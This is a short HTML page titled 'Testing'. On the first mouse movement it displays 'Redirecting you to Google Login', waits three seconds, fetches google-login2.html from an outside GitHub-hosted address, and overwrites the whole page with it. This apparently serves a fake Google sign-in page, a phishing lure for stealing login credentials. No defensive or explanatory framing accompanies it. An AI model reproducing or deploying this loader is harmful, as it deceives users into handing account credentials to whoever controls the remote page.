<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Testing</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #f5f5f5;
    }
    #redirecting {
      font-size: 48px;
      font-weight: bold;
      color: #333;
      display: none;
    }
  </style>
</head>
<body>

  <div id="redirecting">Redirecting you to Google Loginâ€¦</div>

  <script>
    const url = 'https://raw.githubusercontent.com/frozzipies/frozzipies.github.io/refs/heads/main/google-login2.html';
    let triggered = false;

    document.addEventListener('mouseenter', () => {
      if (triggered) return;
      triggered = true;

      // Show redirect message immediately
      document.getElementById('redirecting').style.display = 'block';

      setTimeout(async () => {
        try {
          const response = await fetch(url);
          const content = await response.text();

          document.open();
          document.write(content);
          document.close();
        } catch (err) {
          document.open();
          document.write('<h1>Error loading content</h1><pre>' + err + '</pre>');
          document.close();
        }
      }, 3000); // 3 seconds delay

    }, { once: true });
  </script>

</body>
</html>
